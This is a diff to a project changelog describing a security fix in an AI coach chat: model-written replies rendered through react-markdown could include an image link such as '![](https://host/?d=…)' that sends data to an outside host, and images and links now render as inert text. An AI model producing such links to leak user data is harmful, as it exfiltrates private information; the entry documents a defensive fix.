@@ -9,8 +9,8 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Fixed
 
-- **The coach's reply could reach a third-party host** (`src/components/AIChat.tsx`,
-  `nginx.conf`) — the message body is model-authored text rendered with
+- **The coach's reply could reach a third-party host** (`src/components/coachMarkdown.tsx`,
+  `src/components/AIChat.tsx`, `nginx.conf`) — the message body is model-authored text rendered with
   react-markdown, whose component map only remapped headings. Everything else
   was the library default, which renders `img` and `a` with arbitrary targets.
   A `![](https://host/?d=…)` in a coach reply therefore fired an outbound GET
@@ -23,7 +23,10 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   reference is the *only* way text the model produces can leave the browser.
 
   `img` and `a` now render inert, keeping the alt text and the link target as
-  plain text so nothing disappears silently either. Nothing is lost by this: the
+  plain text so nothing disappears silently either. The component map moved to
+  its own module so the guarantee can be tested without the chat component's
+  mock stack — and because exporting a non-component from a component file
+  breaks fast refresh. Nothing is lost by this: the
   coach's citations never came through markdown — they arrive structured on
   `msg.sources` and are still rendered as real links.
 
